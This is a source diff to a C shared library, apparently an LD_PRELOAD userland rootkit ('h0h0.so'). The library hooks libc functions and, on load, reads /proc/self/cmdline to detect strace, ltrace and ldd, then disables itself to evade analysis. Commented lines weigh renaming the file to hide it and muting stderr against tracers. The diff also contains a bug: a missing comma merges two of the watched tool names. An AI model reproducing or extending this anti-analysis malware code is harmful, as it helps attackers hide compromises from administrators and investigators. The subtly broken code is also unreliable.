@@ -1,4 +1,5 @@
 #include <dlfcn.h>
+#include <stdlib.h>
 #include <stdbool.h>
 
 void init(void) __attribute__((constructor));
@@ -22,7 +23,8 @@ void init(void)
 {
     int i;
     FILE *handle;
-    char caller[255];
+    char *caller = NULL;
+	size_t len = 0;
 
     const char *libc_names[] = \
     {
@@ -34,16 +36,20 @@ void init(void)
 
     if((handle = fopen("/proc/self/cmdline", "r")))
     {
-        fread(caller, sizeof(caller), 1, handle);
+		while(getdelim(&caller, &len, 0, handle) != -1)
+		{
+	        if(watchdog(caller))
+    	    {
+        	    /* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
+            	/* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
+
+				puts("Watchdog found!\n");
+            	lib_loaded = false;
+        	}
+		}
+
+		free(caller);
         fclose(handle);
-
-        if(watchdog(caller))
-        {
-            /* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
-            /* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
-
-            lib_loaded = false;
-        }
     }
 
     /* Initialise: pointers to libc functions. */
@@ -80,7 +86,7 @@ int watchdog(char *func)
     size_t i, wd_size;
     const char *watchdogs[] = \
     {
-        /* "ldd", -- bash script (caller = "/bin/bash" -- getenv("_") would be unportable/unreliable I think...) */
+		"/usr/bin/ldd"
         "strace",
         "ltrace"
     };
